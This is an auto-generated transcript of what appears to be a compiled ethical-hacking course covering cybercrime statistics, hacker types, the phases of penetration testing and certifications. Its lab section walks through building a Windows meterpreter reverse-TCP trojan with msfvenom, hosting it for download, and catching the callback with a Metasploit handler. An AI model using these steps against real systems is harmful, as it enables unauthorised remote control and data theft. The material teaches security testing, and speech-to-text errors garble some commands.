trustworthy or is hosted by a hacker
with a malware on that particular file
that you're downloading especially if
you're downloading a pirated program
never download a pirated program so be
very careful when you're downloading
apps when you're downloading an
executable file you can upload it to
virustotal.exe scan it to see if there
are any viruses or malwares within it
the website also helps you analyze urls
to see if the url itself may have any
malicious attacks within them embedded
scripts or redirected scripts or things
like that so you can use those that
website uh to scan for scan the apps
that you're downloading and see if there
is anything malicious about those apps
moving on to cyber crime statistics now
this is going to be interesting let's
talk about how these things
and the percentile of these things in
today's world by 2020 we would have
generated 300 billion passwords
now the human population on this planet
is 7 billion imagine 7 billion having
300 billion passwords and i think half
half the population wouldn't have access
to computers or the internet either so
imagine the number of passwords that we
have and that's what makes us use easy
passwords makes us repeat those
passwords and makes and we use a single
password for multiple accounts right
because there are just so many passwords
that we have to remember but that's the
way it is and if we want to keep
ourselves secure we are responsible for
it so please be very careful with those
passwords 24 000 malicious mobile apps
blocked daily in fact the latest example
that i can give give you i use an
android phone and there's an application
that i've always used called cam scanner
and recently just three days back my
mobile phone started telling me that it
is a malicious app right i've been using
it for years now probably three or four
years maybe more what is the software
you can click pictures of a document it
will automatically convert it it will
it will beautify it if that's a word
convert it into a pdf and i can then
send it as an attachment via email a
very handy app for me or was an handy
app for me it worked beautifully but
three days back suddenly
uh the android operating system and my
antivirus on my
android phone started reporting it as a
malicious software so i went online and
i checked into it and it seemed that
over a period of time the developers
changed their vision of that software
made it spyware and then there was a
dropper involved within that application
which would then download a malware from
a third party server install it and
start spying on you and start showing
you malicious advertisements right so
this was an existing app which was
trusted over a period of years and over
a period of time slowly they modified it
into a spyware kaspersky was an
organization that detected it in the
first place and then pointed it out to
google google took it off the google
play market and now there is a variant
of it available but if you look at the
reviews all of them are one stars where
they have identified that this is a
malware now and it spies on them and it
actually compromised some people's data
so that's the latest example in 2017 or
18 there were 700 000 apps during that
year that were identified by google as
malicious apps and were deleted from
google play so even if they're published
there will be thousands of people who
download it till the time google
realizes that it is a malware and then
deletes it till then you've already been
compromised and there is no way to
protect yourself now so be very careful
when you download these applications in
the healthcare sector ransomware attacks
will quadruple now the healthcare sector
is a very volatile sector it contains a
lot of private and sensitive information
health information about individuals
that can be misused by a lot of
organizations advertisements
pharmaceutical organizations life
insurance people and whatnot right so
these became very lucrative targets for
hackers where if they can steal the
database and sell it on the black market
they will earn a lot of money
ransomwares would basically work the
other way around they encrypt the data
at the hospital side and then they will
hold the hospital ransom to pay up now
you know how hospitals earn nowadays
right so that's a lot of money that
you're looking at cyber crime would cost
up to six trillion dollars in 2021 six
trillion dollars just for cyber crime we
are not talking about the income from
the iit industry we are talking about
how much money we will lose to cyber
crime because of the various attacks
that we that would be created 90 percent
of hackers use encryption not only
encryption most of that once hackers
will try to hide their identity by
spoofing their ip addresses mac
addresses locations they will use
encryption and cryptography to hide
their malicious softwares to fool the
anti-viruses idss ips's and it would it
is a very difficult task to even
identify a particular malware analyze it
and then do a root cause analysis and
try to figure out who the responsible
hacker was so it's a very intensive task
of doing so such things and most of the
hackers would go scot free because it is
very difficult to identify them now
let's move on to the demo it's a very
interesting demo you're using metasploit
which is a penetration testing tool and
if you're going to use a demo of using
metasploit you're going to try to
compromise the security of a particular
system well let's discuss the demo
before we start executing it so what we
have done here is that we have two
virtual machines on vmware workstation
one is the kali linux machine and the
other is a windows 7 machine what we are
going to do is we are going to use a
penetration testing tool called
metasploit which is available freely on
kali linux and we are going to use a
particular payload generator on
metasploit called msfv venom and using
msf venom we are going to create a back
door a executable file which will
contain a trojan or a backdoor and we
are going to try to infect that to the
windows machine and see what happens
when the victim executes that particular
file now we're going to keep it at the
basic level we're just going to create
the trojan and then we're going to
execute it in a later lecture or in a
later video we'll see how we can mask
that trojan into a legitimate looking
application so that a victim can be
fooled by the application that we're
going to execute so let's start with the
demo all right so this is the kali linux
vm and the other machine is a windows 7
virtual machine so what we are going to
do is on the kali linux machine we are
going to just open up a command prompt
right it's just regular command prompt
regular commands and uh what we are
going to do is we are going to use the
msf venom payload generator from
metasploit to create a game.exe file now
the trojan is will be contained within
the game.exe so the command goes as such
msf venom hyphen p for platform we want
it or rather payload at this point in
time we want the payload to be windows
meetup reader reverse underscore tcp
lhost and the ip address for the
localhost i'll explain the command once
i've typed it let's just check what our
ip address for this machine is and we
have 192 168 71.133
and that's what we're going to type in
here 192 168
71.133 l port 4444 hyphen f exe hyphen a
x 86 and we want that output in root
desktop and we want it as game dot exe
so let's go through the command the msf
venom is the initiator command it
invokes the payload generator in
metasploit hyphen p is the payload we
want windows meterpreter reverse tcp so
what is the reverse tcp here the meter
reader allows us for remote code
execution where we are going to create
the payload we are going to execute the
payload at the victims and and the
payload will then generate a connection
back to us
us bring the hackers machine and thus
the local host which is the ip address
of this machine which is the hacker's
machine that you're using right now
which is 192.168.71.133
that's why we have typed in the
localhost and l port is the local port
on which port do we want to listen in or
we want the payload to connect to the
local host so what we are doing is the
meter printer allows us remote code
execution we create the game.exe we
execute it at the victim's end it is
pre-coded to connect to a local host the
ip address is coded over there to a
particular port which in this case is
444. you can put in any port number you
want just ensure that the port is going
to be free and it is not a regularly
used port otherwise you're going to get
problems over there so at this point in
time you're going to keep it as 444.
hyphen f stands for function we got an
executable file hyphen a stands for the
architecture here the architecture is
886 which is x86 which is 32-bit and we
are going to export it and we are going
to host it or we are going to create the
file on root desktop and we are logged
in as root as you can see at the prompt
so when i press enter i should see a
game.exe popping up right about here on
my desktop if the command is correct
which it should be and that's game.exe
wait for it to be compiled properly so
there you can see platform windows for
payload no encoder a payload size 33 333
bytes and final size of executable file
is seventy three thousand eight hundred
and zero eight hundred and two bytes so
now we have created game dot exe now we
are not going to convert this into or
you're not going to merge this into a
malware and things like that we're going
to keep it simple so to keep it simple
what i'm going to do is as a hacker i'm
going to host this on a server which is
going to be on the same machine right so
when we say we want to host an apache
server the server is hosted in a
directory called slash var bar slash www
so let's go there present working
directory uh we can see that we are in
root cd where w and there we are cd html
and that is where our web servers would
be so what we are going to do is we are
going to create a directory mkdir
shared right to an ls and you can see
the shared folder right here ls hyphen
al will give you the list and attributes
and we can see these attributes we want
to change these attributes so we are
going to use a ch chmod recursive
command give the permissions as 755 to
the folder
share since we are in the same directory
we do not need to give the path for
shared let's just verify it and you can
see the permissions being changed and
now what we are going to do is we are
going to change the ownership from root
to www hyphen data for the web hosting
so ch
own for change ownership recursive
www hyphen data to shared all right
let's check if that's been done properly
and you can see that earlier it was root
root and now it is dub dub dub hyphen
data
that's that we have www let's go back uh
what we want to do is we want to copy
game.exe into this folder so
cp root desktop game.exe where dub
html shared and cd shared let's see we
have game.exe right there there it is
and now what we want to do is service
apache to
start so essentially what we have done
is we have created a directory in the
html folder to host this file and we've
copied it from our desktop into the
shared folder and i'm going to pause
here for a minute all right so we have
started the service for the apache 2
server that means we have started the
web server we have hosted the game.exe
on the web server in the shared folder
we have changed the permissions and the
ownership for the shared folder now we
are going to go on to the windows 7
machine and we are going to open up the
browser and see if the web server is now
accessible so if you remember the ip
address of that machine was
192.168.71.133 and we have it we were in
the shared folder 92 168 71.133
shared and if this is done properly we
should see the game.exe right here and
once we click on it it's going to ask us
whether we want to save the file 72.1 kb
we're going to save it and i'm going to
save it on i think it just saved it here
and now before we execute it we're going
to go back into kali line next and we
are now going to start the listener
right so we have created the exploit you
created the payload rather we have
hosted it onto a web server which means
that when somebody double clicks on it
the machine is going to try to create a
reverse connection to our hacker's
machine but our hacker's machine needs
to be configured to handle that incoming
connection so we are going to start off
with msf console now msf console is the
command which starts up metasploit right
so we're just going to take a minute
over here uh you can see it's metasploit
framework control it's going to start
it's uh does take a little bit of a
while and we're just going to wait it
out let me turn this into full screen i
can see uh at the bottom left you're on
msf con on the msf prompt we are using
metasploit with 1 699 exploits now this
is not a completely updated version the
latest one would have around 1800
exploits but the one that we want is uh
exists in this version so we are good to
go so we start off with the
configuration of metasploit to listen in
on to that particular connection so we
say use
exploit multi handler and when you say
multi multi is basically something that
affects multiple operating system and
we're going to use that exploit and you
can see uh it's now opening up the
handler which we need to configure and
here we're going to set the payload that
it is going to expect the payload being
windows meter preter reverse underscore
tcp i can see that the payload has been
configured we are going to say show
options and you'll see it is going to
ask us options uh for the payload which
means the localhost the listen address
and the listing port now you can see we
had by default given 444 which is the
default port for this exploit within
metasploit if you want to change if you
have changed the port when you created
game.exe you need to change the port
over here as well and the commands here
that says set lhost equals
192.168.71.133
enter and i think i did a typo so uh
there's no equal to that's it and you
can see now it shows the equal to mark
and we have now set the local host if
you want to set the l port that's how we
do it we had 444 and there it is so if
you have changed the port in the
game.exe ensure that you change the port
here as well show options and you'll see
now the data is populated over here l
host which is the local host is 192 168
71.133
and l port the local port is 444. we
have configured this and now what we're
going to do is we're just going to type
in exploit
and now you can see that it has started
the reverse tcp handler on 190 to 168
71.133
on port 444 so now when the victim which
is windows 7 executes the file and we
say run at the victim's end there's
nothing that should happen uh it's just
uh resolving something and at the
other end you can see that a meet
operator station has been opened and it
shows us that from the victim's ip which
is 71.129
on port 49493 we are connected to our
machine so that's that's the connection
that has happened press enter and you
can see it exists exits the session
let's just look at the ip address on
windows to confirm that was the same
machine that we had and that's 129 right
there it is
let's
open up this file again and see what
happens and you can see the second
session being opened up right here to a
pwd and you can see that we were
connected to that particular website
right so that's what uh this trojans are
supposed to do give us a backdoor entry
and we then
are able to connect and we are able to
copy data and we are able to basically
we have a back door so we can do
anything and everything that we want to
do we humans are highly tech savvy in
today's times
with the extensive use of the internet
and modern technologies there is a
massive challenge in protecting all our
digital data such as net banking
information account credentials and
medical reports to name a few have you
heard about the deadly wannacry
ransomware attack
the attack happened in may 2017 in asia
and then it spread across the world
within a day more than 230 000 computers
were infected across 150 countries
the wannacry cryptoworm encrypted the
data and locked the users out of their
systems
for decryption of the data the users
were asked for a ransom of 300 to 600
dollars in bitcoin
the users who used the unsupported
version of microsoft windows and those
who hadn't installed the security update
of april 2017 were targeted in this
attack
the wannacry attack took a toll on every
sector top tier organizations like
hitachi nissan and fedex had to put
their businesses on hold as their
systems were affected too
now this is what you call a cyber attack
to prevent such attacks cyber security
is implemented
we can define cyber security as the
practice of protecting networks programs
computer systems and their components
from unauthorized digital attacks these
illegal attacks are often referred to as
hacking
hacking refers to exploiting weaknesses
in a computer network to obtain
unauthorized access to information a
hacker is a person who tries to hack
into computer systems
this is a misconception that hacking is
always wrong there are hackers who work
with different motives
let's have a look at three different
types of hackers black hat hackers are
individuals who illegally hack into a
system for monetary gain on the contrary
we have white hat hackers who exploit
the vulnerabilities in a system by
hacking into it with permission in order
to defend the organization this form of
hacking is absolutely legal and ethical
hence they are also often referred to as
ethical hackers
in addition to these hackers we also
have the grey hat hackers as the name
suggests the color gray is a blend of
both white and black
these hackers discover vulnerabilities
in a system and report it to the
system's owner which is a good act
but they do this without seeking the
owner's approval
sometimes grey hat hackers also ask for
money in return for the spotted
vulnerabilities
now that you have seen the different
types of hackers let's understand more
about the hacking that is legal and
valid ethical hacking through an
interesting story dan runs a trading
company he does online training with the
money his customers invest everything
was going well and dan's business was
booming until a hacker decided to hack
the company's servers the hacker stole
the credentials of various trading
accounts he asked for a lump sum ransom
in exchange for the stolen credentials
dan took the hacker's words lightly and
didn't pay the hacker
as a result the hacker withdrew money
from various customers accounts and dan
was liable to pay back the customers
dan lost a lot of money and also the
trust of his customers
after this incident dan gave a lot of
thought as to what could have gone wrong
with the security infrastructure in his
company
he wished there was someone from his
company who could have run a test attack
to see how vulnerable systems were
before the hacker penetrated into the
network
this was when he realized he needed an
employee who thinks like a hacker and
identifies the vulnerabilities in his
network before an outsider does
to do this job he hired an ethical
hacker john
john was a skilled professional who
worked precisely like a hacker in no
time he spotted several vulnerabilities
in dan's organization and closed all the
loopholes
hiring an ethical hacker helped dan
protect his customers from further
attacks in the future
this in turn increased the company's
productivity and guarded the company's
reputation
so now you know hacking is not always
bad
john in this scenario exposed the
vulnerabilities in the existing network
and such hacking is known as ethical
hacking ethical hacking is distributed
into six different phases
let us look at these phases step by step
with respect to how john our ethical
hacker will act before launching an
attack the first step john takes is to
gather all the necessary information
about the organization's system that he
intends to attack this step is called
reconnaissance he uses tools like nmap
and h-ping for this purpose
john then tries to spot the
vulnerabilities if any in the target
system using tools like nmap and expose
this is the scanning phase
now that he has located the
vulnerabilities he then tries to exploit
them
this step is known as gaining access
after john makes his way through the
organization's networks he tries to
maintain his access for future attacks
by installing back doors in the target
system
the metasploit tool helps him with this
this phase is called maintaining access
john is a brilliant hacker hence he
tries his best not to leave any evidence
of his attack
this is the fifth phase clearing tracks
we now have the last phase that is
reported
in this phase john documents a summary
of his entire attack the vulnerabilities
he spotted
the tools he used and the success rate
of the attack
looking into the report dan is now able
to take a call and see how to protect
his organization from any external cyber
attacks
don't you all think john is an asset to
any organization if you want to become
an ethical hacker like john
then there are a few skills that you
need to acquire
first and foremost you need to have a
good knowledge of operating environments
such as windows linux unix and macintosh
you must have reasonably good knowledge
of programming languages such as html
php python sql and javascript
networking is the base of ethical
hacking hence you should be good at it
ethical hackers should be well aware of
security laws so that they don't misuse
their skills
finally you must have a global
certification on ethical hacking to
successfully bag a position of an
ethical hacker like john
few examples of ethical hacking
certification are certified ethical
hacker certification ceh comptia pintest
plus
and licensed penetration tester
certification to name a few
simply learn provides a cyber security
expert masters program that will equip
you with all the skills required by a
cyber security expert
you could have a look at it by clicking
the link in the description the endless
growth of technologies in this area is
directly proportional to the number of
cyber crimes
cyber crimes are estimated to cost six
trillion dollars in 2021
hence to tackle these cyber crimes
organizations are continuously on the
lookout for cyber security professionals
the average annual salary of a certified
ethical hacker is 91 000 in the us and
approximately rupees 7 lakhs in india
so what are you waiting for get
certified and become an ethical hacker
like john and put an end to the cyber
attacks in the world when we hear the
term hacker we may picture a dangerous
cyber criminal however not all hackers
are inherently bad they are powerful
individuals who use their technical
skills to break into computer networks
and bypass security measures hacking is
not always bad and it is to be noted
that the world of computers is actually
safer to an extent because of a
particular type of hacker
a hacker is deemed to be good or bad
depending on their motive and whether or
not they are breaking the law
hackers are basically categorized by the
type of metaphorical hat they don't
white hat grey hat and black hat
hackers can either be a black hat or a
white hat or a gray hat
hackers can be good or bad depending on
which color hat they decide to wear and
by this we mean their hacking motifs and
obviously not in the sense of creating a
fashion statement here
let's have a look at our story our story
here revolves around dan who is the
owner of a company that provides a
platform for video conferencing
his platform enables online
communication for video meetings audio
meetings and webinars
just like other video conferencing
platforms his platform too has built-in
features like chat recording screen
sharing and so on
everything went well and his business
increased tremendously with the onset of
the covet 19 pandemic
kowitt 19 accelerated the rise of the
worldwide digital economy and it made
people rapidly adopt video conferencing
tools and apps
in a contactless world starting from
employee interactions to family
get-togethers to virtual workout classes
everything happened virtually dance
video conferencing platform enabled
long-distance communication and enhanced
collaboration
so now you might be wondering what could
have gone wrong well there are many
risks involved when it comes to the
safety of these online platforms
online meeting rooms are susceptible to
a number of digital threats
dan received complaints from his
customers that his platform was in
secure and safe anymore
little did dan know that the popularity
of his video conferencing platform made
hackers eager to disrupt the virtual
meetings and hijack the conferences
his platform witnessed complaints like
the addition of an unknown participant
in every meeting room someone covering
up information that is being presented
and also unknown screen recording of a
meeting to name a few
these intruders were sneaky hackers who
tried to gain access to sensitive
information and who try to disrupt
meetings
and how did these hackers manage to do
all this
well this was done by exploiting
weaknesses in dan's computer network in
order to obtain unauthorized access to
crucial data and sensitive information
this is known as hacking and the
individuals who carry this out are known
as hackers
in this form of hacking that dan
witnessed hackers exploited dan's
company's security posture by
identifying weaknesses in it in order to
intrude into the meetings and gain
access to business data or personal data
and this form of hacking is definitely
bad and unethical the hackers who
carried this against dance company are
known as black hat hackers
these hackers are cyber criminals who
carry out cyber attacks with a negative
intention
these attacks can be in the form of
trojan virus malware attacks phishing
attacks ddos attacks man in the middle
attacks sequel injection attacks and so
on
so who exactly is a black hat hacker
like in the case of dance organizations
cyber attack
black hat hackers are highly skilled
cyber criminals who break into computer
systems and networks with malicious
intent
they illegally hack into a system and
this is obviously without the system
owners approval
such hackers do not abide by the laws
they violate laws and disrupt networks
the motive behind these attacks vary
from monetary gains to personal profit
usually they are for monetary gains
black hat hackers may violate the
confidentiality integrity or
availability of a company's systems and
data they may also use malware to
destroy files or steal passwords credit
card numbers and other confidential
information
black hat hackers are also sometimes
called crackers
so this is who a black hat hacker is
moving back to dan's story
black hat hackers disrupted his business
and he lost his customers as nobody wish
to communicate on an unsecure platform
it is but true right would you be okay
to use a platform that is unsafe none of
us want to have unknown people in our
meetings right this is how dan's
customers felt too and this news spread
and his company's reputation took a bad
hit
that is when ted approached dan so who
is dead let's have a look at that now
ted who was unknown to dan explained to
him that he found dan's network to be
weak
ted told dan that he has identified
vulnerabilities in dance systems and
networks and he will fix them provided
dan pays him well
dan had nothing to lose and without any
further delay he paid ted a good amount
of money to fix the vulnerabilities in
dance networks
on receiving the money ted began his
work and he fixed all the issues and
vulnerabilities in dan's network he made
sure that nobody can exploit dan's
network vulnerabilities again and this
way he safeguarded dan's network for the
time being
so who is dead
well he's called a gray hat hacker as
they say not all things are black and
white so is the concept of grey hat
hackers as fascinating as the name
sounds let us dive deep into
understanding the role of a grey hat
hacker a grey hat is a security expert
who may at times violate the laws or the
ethical standards
however they do not carry a malicious
intent unlike a black hat hacker
hence they are known to work both
defensively and offensively
they land between the good and the bad
gray hat hackers look for
vulnerabilities in a system without
permission but with good intentions
just like how ted informed dan about how
he could exploit dan's system
vulnerabilities grey hat hackers inform
an organization the same and in return
ask for a fee to fix it
in some cases when the organization
doesn't comply grey hat hackers may
become black hat hackers
although a grey hat hacker's intention
might not be bad what they do is still
illegal since they do not have
permission to break into another system
back to our story
although dance issue was sorted by ted
for the time being he had a few concerns
his first concern was history repeating
itself yes he was worried about what if
black hat hackers hack into his systems
again
although his system vulnerabilities are
fixed at the moment it was a matter of
time before they could be exploited
again with new hacking techniques
his next thought was to have a
professional who could constantly keep a
tab on his networks and protect it from
hackers don't you think his concerns
were justified yes it was as this was
the only way he could provide a safe and
secure video conferencing platform in
the long run
that is when dan's friend came to his
rescue and introduced anne the ethical
hacker to him
and being an ethical hacker assured dan
that she would scan and identify his
network for system vulnerabilities
before an outsider exploits it and she
would fix those vulnerabilities on a
regular basis
such ethical hackers like anne are
called white hat hackers
now that we saw who black hat hackers
and grey hat hackers were it is time we
learn about our third type of hacker who
is a white hat hacker
a white hat hacker gains access to
networks with an intention to fix the
identified weaknesses
they also perform penetration testing
and vulnerability assessments and break
into systems with permission
they search for loopholes or
vulnerabilities in any given piece of
technology just like how a black hat
hacker would do
however white hat hackers harden their
organization system before the bad guy
can get in
their goal is to spot system and network
vulnerabilities in order to improve
system security
white hat hackers are also known as
ethical hackers since they obey the law
of the land and follow a code of ethics
many companies and government
organizations employ white hat hackers
to help them secure their systems
these hackers are typically hired by
organizations to look for
vulnerabilities in a system like other
hackers
the only difference being they are given
permission to break in
once dan spots the vulnerabilities she
documents her findings and gives dan
advice on how to fix them or she'll even
take it up to fix them so that an
outsider cannot spot it in the future
and does this on a regular basis as
system updates happen regularly and it
is imperative to be on track with it and
fix new vulnerabilities
this made sure dan's network is now safe
and secure
gradually he regained his customers
trust and his platform got back to being
one of the best and safest platforms for
video conferencing
this resulted in a huge business growth
and dan was very happy
just like how ann put an end to dance
business problems there are many white
hat hackers out there who are in great
demand by organizations to safeguard
their networks from cyber attacks
and if you are interested in a career in
ethical hacking then simply learn can
help you fulfill your dreams
simply learn ch version 11 certification
provides you the hands-on training
required to master the techniques
hackers use to penetrate network systems
and fortify your system against it
this ethical hacking course is aligned
with the latest ch version 11 by ec
council and will adequately prepare you
to increase your blue team skills
so what are you waiting for get
certified with simply learn and become a
certified ethical hacker and put an end
to the cyber crimes in the world
remember the more active white hat
hackers are the fewer opportunities
black hat hackers have for system
exploitation
so let's talk about hacking and what
exactly hacking is hacking refers to
exploiting weaknesses in a computer
network to obtain unauthorized access to
information a hacker is a person who
tries to hack into computer systems now
here there are some keywords that we
need to understand first and foremost
exploit when you are exploiting
weaknesses weaknesses are technically
called vulnerabilities which are
basically design flaws misconfiguration
errors usage of default usernames and
passwords which have not been modified
so any misconfiguration or anything that
has been left behind by a security
administrator that can be misused which
means exploited by a hacker to gain
unauthorized access so the next term is
unauthorized access something that you
are not allowed to do and when you say a
hacker is a person who tries to hack
it's basically a person with malicious
intent trying to gain access to a system
or a resource that they are not
authorized to access in the first place
how do they do it they find a
vulnerability that is a weakness or a
flaw and then they misuse it to gain
access to that particular network so
here in the diagram you can see that a
sender on the left hand side is trying
to send some data to the receiver on the
right hand side the hacker would try to
gain unauthorized access to the
transmission that is being sent and
would try to capture the data packets
and read the secrets within let's look
at a business case scenario into hacking
now there is an organization everybody
is going around their own business when
they realize that their systems may have
been compromised now they're trying to
look at the customer data to ensure that
that has not been compromised and trying
to assure the customers however they do
realize that some customer data has been
lost and even the company reports have
been modified as well now this is the
scenario where there have been some
security controls in place and those
controls have been identified they
realized that there is an attack that
has happened and based on that attack
they have realized that the data has now
been compromised and the records have
been modified uh by the hacker which
means that the data is no longer
trustworthy and thus cannot be used by
the business for any legal transactions
so then the hacker gives a call to the
organization or gets connected to the
organization demanding a ransom for the
data to be replaced to be taken back
into the original state where it was
trusted and thus the organization can
utilize it for business transactions the
organization has probably no backup so
they decide that they want to pay the
lump sum to the hacker to restore that
data so that they can continue on with
the business does money exchanges and
the hacker is able to restore that data
and the business continues that as usual
however the activity here of a hacker
trying to leverage the misconfiguration
of the weaknesses in the organization's
security thus being able to hack them
and make these ransomware demands so the
company then wants to figure out even if
having a security system in place how
was the hacker able to hack their
systems thus one of the employees comes
up with a brilliant idea of identifying
vulnerabilities in the network
to proactively search for any flaws that
have been left behind so that they can
plug those flaws and nobody can misuse
them
thus they figure out that they want to
hire an ethical hacker who would help
them identify the security portion of
the organization identify the weaknesses
vulnerabilities and flaws and help them
remedy those laws so that in future
scenarios these scenarios will not
happen so before we go into an ethical
hacker let's understand what are the
types of hackers so what are the types
of hackers hacker is a technically
skilled person who is very adept with
computers they have good programming
skills they understand how operating
system works they understand how
networks work they understand how to
identify flaws and vulnerabilities
within all of these aspects and then
they understand and know how to misuse
these flaws to get a outcome which would
be detrimental to the health of the
organization
so there are six type of hackers that
have been identified black hat hackers
white hat hackers grey hat script
kiddies nation's players sponsored
hackers and a hacktivist so black hat
hackers are basic basically uh the
malicious hackers who have malicious
intent and have criminalistic tendencies
they want to harm the organization by
hacking into their infrastructure by
destroying their infrastructure by
destroying the data so that they can
gain from it from a monetary perspective
these guys are also known as crackers
the main aspect of these people are that
they have malicious intent they try to
do unauthorized activities and they try
it for personal gain another important
aspect to remember is that a black hat
hacker will always try to hide their
identity they'll spoof their online
digital identity by masking it by
spoofing their ip addresses mac
addresses and try to remain anonymous on
the network a white attacker on the
other hand is also an ethical hacker or
a security analyst who's an individual
who will do exactly the same thing that
a black hat hacker would do minus the
malicious intent plus the intent of
helping the organization identifying the
flaws and remedying them so that nobody
else can misuse those vulnerabilities so
they are authorized to act on the
company's behalf they are authorized to
do that activity which would help the
company identify those flaws and thus
help the company mitigate those flaws
improving on their security portion so
these uh these kind of security experts
or ethical hackers would help
organizations defend themselves against
unauthorized attacks grey hat hackers is
a blend of both white hat and black hat
hackers so here they can work
defensively and offensively both they
can accept contracts from organizations
to increase their security posture at
the same time they can also get
themselves involved in malicious
activities towards other organizations
to personally gain or benefit from them
by doing unauthorized activity script
kitties are people uh who are
technically not much aware about what
hacking is uh they rely on existing
tools that have been created by other
hackers they have no technical knowledge
of what they're doing it's just a hit or
miss for them so they just get their
hands on a tool they try to execute
those tools uh if the hack works it
works otherwise it doesn't so these
people are basically who are noobs or
newbies who are trying to learn hacking
or uh just uh people who with malicious
intent who just want to have some fun or
trying to impress people around then we
have the nation or the state-sponsored
hackers as the name suggests these
hackers are sponsored by their
government now this may not be a
legitimate job but most of the
governments do have hackers enrolled in
their pay on uh
on their organizations to spy on their
enemies to spy on various countries and
try to figure out uh the aspirations of
those countries so this is basically a
spying activity where you're technically
trying to get access to other countries
resources and then try to spy on them to
figure out what their activities have
been or what their future plans have
been and then we have the hacktivist
who's an individual who has a political
agenda to promote and they promote it by
doing hacking so these guys what is the
difference between a black hat hacker
and a hacktivist the black hat hacker
may try to hide their identity the
hacktivist will claim responsibility of
what they have done so for them it's a
political agenda political cause and
they will try to hack various
organizations to promote their cause
they would probably do this by defacing
the website and posting the messages
that they want to promote on these
websites so what exactly is ethical
hacking then we have discussed the types
of hackers we have identified a
malicious hacker as a black hat hacker
with the intent
of doing harm to an organization's
network for personal gain we have
discussed what the ethical hacker is so
an ethical hacker would be doing the
same activity but in an authorized
manner so they would have legal
contracts that they would be signing
with the organization it would give them
a definite scope of what they are
allowed to do and what they are not
allowed to do and the ethical hackers
would function within those scopes or
try to execute those test scenarios
where they would be able to identify
those flaws or those system
vulnerabilities and then they would be
submitting a report to the management of
what they have found they would also
help the management to mitigate or to
resolve those weaknesses so that nobody
else can misuse them later on they might
use the same techniques and the same
tools that black hat hackers do however
the main difference here is that these
guys are authorized to do that
particular activity they're doing it in
a controlled manner with the intent of
helping the organization and not with
the intent of personal gains so who's an
ethical hacker again an ethical hacker
is a highly intelligent highly educated
person who knows how computers function
how programming languages work how
operating systems work they can
troubleshoot they're technically very
adept at computing they understand the
architecture they understand
how various components in a computer
work they can troubleshoot those
components and they can basically be
very good with programming as well now
when i say programming we don't want the
ethical hacker to be a good developer of
applications we want them to understand
programming in such a way that they can
create scripts they can write their own
short programs like viruses worms
trojans or exploits which should help
them achieve the objective that they
have set out for so uh here you can see
the ethical hacker they are individuals
who perform a security assessment of the
companies with the permission of cons
concerned authorities so what is a
security assessment a security
assessment is finding out the exact
security posture of the organization by
identifying what security controls are
in place how they have been configured
and if there are any gaps in the
configurations themselves so an
organization will hire a heckler hacker
they they would give the ethical hacker
the information about what information
is or what security controls what
firewalls now what idss ipss introgen
detection or intuition prevention
systems antiviruses are already in place
and then they will ask the ethical
hacker to figure out a way to bypass
these mechanisms and see if they can
still hack the organization what is the
need of an ethical hacker the need of an
ethical hacker is proactive security the
ethical hacker would identify all the
existing flaws in an organization and
try to resolve those laws to help secure
the organization from black hat hackers
so ethical hackers would prevent hackers
from cracking into an organization's
network by securing the organization by
improving on their security on a
periodic basis and they would also try
to identify system vulnerabilities
network vulnerabilities or application
level vulnerabilities that would have
been missed or have already been missed
and then tried to figure out a way of
plugging them or
resolving them so that they cannot be
misused by other hackers they would also
analyze an enhanced organization
security policies now what are policies
policies are basically documents that
have been created by an organization of
rules that all the employees need to
follow to ensure that the security of an
organization is maintained for example a
password policy a password policy would
help users in an organization to adhere
to the standards the organization has
identified for a password complexity for
example a password when a user is
creating them should adhere to standards
where they are using random words they
are they contain the alphabet a through
z uppercase and lowercase 0 through 9 as
numerics and special characters and
they're randomized so that the password
becomes much more stronger to prevent
from brute force attacks so what would
an ethical hacker do at this point in
time they would try to test the strength
of the passwords to see if brute force
attacks or dictionary attacks are
possible and if any of these passwords
can be cracked they will ensure that all
the employees are following the policies
and all the passwords are as secured as
the policies want them to be if there
are any gaps in the policies or the
implementation of the policy it is the
ethical hacker's responsibility to
identify those gaps and warn the
organization about it similarly they
would also try to protect any personal
information any data that is owned by
the organization that is critical for
the functioning of the organization and
they'll try to protect it by from
falling into the hacker's hands now what
are the skills that are required of an
ethical hacker these are the following
skills so first and foremost they should
have good knowledge with operating
systems such as windows linux unix and
mac now when we say knowledge about
operating systems it's not only about
how to use those operating systems but
how to troubleshoot those operating
systems how these operating systems work
how these operating systems need to be
configured how can they be secured for
example securing an operating system is
not only installing a firewall and an
antivirus but you need to configure
permissions on an operating system of
what users are allowed to do and what
users are not allowed to do for example
limiting the installation of
applications how are we going to do that
we need to go into the system center the
security center of windows and we need
to configure security parameters over
there of what are acceptable softwares
and what are not same with linux and mac
software's operating systems so we need
to know how we can secure these
operating systems similarly all of these
would have desktop versions and server
versions of operating systems as a
ethical hacker we need to know the
desktop and server versions both how to
configure them and how to provide
services within the organization on
these servers so that they can be
consumed in a secure manner by all the
employees at the same time they should
also be knowledgeable of programming
languages or scripting languages such as
php python ruby html for programming if
you will because web servers come into
the picture so again they should not be
great developers where they can create
huge applications but they should be
able to develop scripts understand those
scripts analyze those scripts and figure
out what the output should be of those
scripts to achieve the hacking goals
that they have set out for an ethical
hacker should have a very good
understanding about networking no matter
whether you're in application security
you're in network security or you're in
host-based security since a computer
will always be connected to a network
either a local area network like a lan
or the internet we should know how
networking works we should know the
seven layers of the osi model we should
know which protocols work on those seven
layers we should identify the tcp model
and how osi model can be mapped to the
tcp model we should understand how tcp
and udp work how how each and every
protocol is crafted how they are
supposed to behave for us to analyze and
understand any network based attacks we
should be very good in security measures
so we should know where those
vulnerabilities would lie what are the
latest exploits available in the market
and we should be able to identify them
we should be able to know the techniques
and the tools of how to deal with
security how to analyze security and
then how to implement security to
enhance it as well along with that it is
important that a security analyst or
ethical hacker is aware of the local
security laws and standards why is that
because an organization cannot do any
illegal activity whatever responses that
they have whatever security mechanisms
whatever security controls they will
implement they need to be adhering to
the local law of the land they should be
legal in nature and should not cause
undue harm to any of the employees or
any of the third party clients that they
are dealing with so the ethical hackers
should be aware of what security laws
are before they implement security
controls or even before they start
testing for security controls and all of
these should be backed up by having a
global certification or a globally valid
certification related to networking
related to security ethical hacking the
law of the land anything and everything
maybe even programming it's good to have
a certification in php perl python ruby
and so on so forth why because most of
the organizations when they hire ethical
hackers look out for these
certifications especially globally valid
certifications so that they can be sure
or they can be assured that the person
that they are hiring has the required
skill set so let's talk about a few of
the tools that a ethical hacker would
utilize in the testing scenarios to be
honest there are hundreds of tools out
there what you see on the screen are
just a few examples of them
nessus is a vulnerability scanner what
is a vulnerability scanner it is an
automated tool that is designed to
identify vulnerabilities within hosts
within
operating systems within networks so
they come with their ready-made
